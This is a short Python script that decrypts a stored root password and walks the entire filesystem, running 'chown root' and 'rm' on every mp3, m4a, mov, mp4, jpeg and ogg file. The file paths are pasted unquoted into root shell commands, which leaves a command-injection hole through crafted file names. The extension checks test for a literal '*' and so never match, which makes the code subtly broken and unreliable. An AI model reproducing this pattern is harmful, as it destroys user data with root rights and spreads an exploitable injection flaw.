# Designed by Luke Dinkler and Peter Toth 2015

import os, admin
from rootpassencryption import *

p = Encryption()
if os.path.exists("p.dat"):
	UserPasswd = p.decrypt()
else:
	print("No password file loaded!")
	
def RmMediaFiles():
	for root, dirs, files in os.walk("/"):
		for file in files:
			if file.endswith("*.mp3"):
				admin.AdminExec("chown root " + os.path.join(root, file), UserPasswd)
				admin.AdminExec("rm " + os.path.join(root, file), UserPasswd)
			if file.endswith("*.m4a"):
				admin.AdminExec("chown root " + os.path.join(root, file), UserPasswd)
				admin.AdminExec("rm " + os.path.join(root, file), UserPasswd)
			if file.endswith("*.mov"):
				admin.AdminExec("chown root " + os.path.join(root, file), UserPasswd)
				admin.AdminExec("rm " + os.path.join(root, file), UserPasswd)
			if file.endswith("*.mp4"):
				admin.AdminExec("chown root " + os.path.join(root, file), UserPasswd)
				admin.AdminExec("rm " + os.path.join(root, file), UserPasswd)
			if file.endswith("*.jpeg"):
				admin.AdminExec("chown root " + os.path.join(root, file), UserPasswd)
				admin.AdminExec("rm " + os.path.join(root, file), UserPasswd)
			if file.endswith("*.ogg"):
				admin.AdminExec("chown root " + os.path.join(root, file), UserPasswd)
				admin.AdminExec("rm " + os.path.join(root, file), UserPasswd)
			
			
